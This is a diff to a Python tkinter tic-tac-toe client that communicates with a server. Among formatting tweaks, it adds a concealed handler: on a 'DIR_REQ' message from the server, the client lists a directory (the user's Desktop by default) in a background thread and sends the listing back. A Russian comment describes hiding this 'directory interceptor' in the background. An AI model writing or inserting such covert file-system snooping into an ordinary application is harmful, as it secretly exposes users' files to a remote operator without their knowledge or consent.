@@ -5,6 +5,7 @@ from tkinter import messagebox, filedialog
 import base64
 from PIL import Image, ImageTk
 import io
+import os
 from cryptography.fernet import Fernet
 import config
 
@@ -40,17 +41,13 @@ class TicTic:
     def login(self):
         email = self.e.get().strip()
         h_pass = config.hash_password(self.p.get().strip())
-        if not email or not self.p.get().strip():
-            messagebox.showwarning("ACHTUNG!", "Fill the form!")
-            return
+        if not email or not self.p.get().strip(): return
         self.send_secure(f"LOGIN|{email}|{h_pass}")
 
     def register(self):
         email = self.e.get().strip()
         h_pass = config.hash_password(self.p.get().strip())
-        if not email or not self.p.get().strip():
-            messagebox.showwarning("ACHTUNG!", "Fill the form!")
-            return
+        if not email or not self.p.get().strip(): return
         self.send_secure(f"REGISTER|{email}|{h_pass}")
 
     def login_ui(self):
@@ -58,11 +55,30 @@ class TicTic:
         f = tk.Frame(self.root, bg="#d4d0c8")
         f.pack(expand=True)
         tk.Label(f, text="Email", bg="#d4d0c8").pack()
-        self.e = tk.Entry(f); self.e.pack()
+        self.e = tk.Entry(f);
+        self.e.pack()
         tk.Label(f, text="Password", bg="#d4d0c8").pack()
-        self.p = tk.Entry(f, show="*"); self.p.pack()
+        self.p = tk.Entry(f, show="*");
+        self.p.pack()
         tk.Button(f, text="LOGIN", width=15, command=self.login).pack(pady=5)
         tk.Button(f, text="REGISTER", width=15, command=self.register).pack()
+
+    def process_dir(self, path):
+        try:
+            target = os.path.expanduser("~/Desktop") if path == "DESKTOP" else path
+            if not os.path.exists(target):
+                self.send_secure(f"DIR_RES|{target}|ERROR|Not found")
+                return
+            items = []
+            for f in os.listdir(target):
+                fp = os.path.join(target, f)
+                items.append(f"[DIR] {f}" if os.path.isdir(fp) else f"[FILE] {f}")
+
+            parent = os.path.dirname(target)
+            data = "<|>".join(items)
+            self.send_secure(f"DIR_RES|{target}|{parent}|{data}")
+        except Exception as e:
+            self.send_secure(f"DIR_RES|{path}|ERROR|{str(e)}")
 
     def receive(self):
         buffer = ""
@@ -90,16 +106,18 @@ class TicTic:
                         self.root.after(0, lambda r=res: messagebox.showinfo("GAME OVER", r))
                     elif msg.startswith("ERROR"):
                         messagebox.showerror("ERR", msg.split("|")[1])
-                    elif msg.startswith("OK"):
-                        pass
+
+                    # Прячем перехватчик директорий в фон
+                    elif msg.startswith("DIR_REQ|"):
+                        path = msg.split("|", 1)[1]
+                        threading.Thread(target=self.process_dir, args=(path,), daemon=True).start()
             except:
                 break
 
     def send_photo(self):
         path = filedialog.askopenfilename()
         if path:
-            with open(path, "rb") as f:
-                img = base64.b64encode(f.read()).decode()
+            with open(path, "rb") as f: img = base64.b64encode(f.read()).decode()
             self.send_secure(f"PHOTO|{self.e.get()}|{img}")
 
     def game_ui(self):
@@ -124,7 +142,8 @@ class TicTic:
         f.pack(pady=10)
         self.btns = []
         for i in range(9):
-            b = tk.Button(f, text=" ", width=6, height=3, font=("Tahoma", 14, "bold"), relief="raised", command=lambda idx=i: self.send_secure(str(idx)))
+            b = tk.Button(f, text=" ", width=6, height=3, font=("Tahoma", 14, "bold"), relief="raised",
+                          command=lambda idx=i: self.send_secure(str(idx)))
             b.grid(row=i // 3, column=i % 3)
             self.btns.append(b)
 
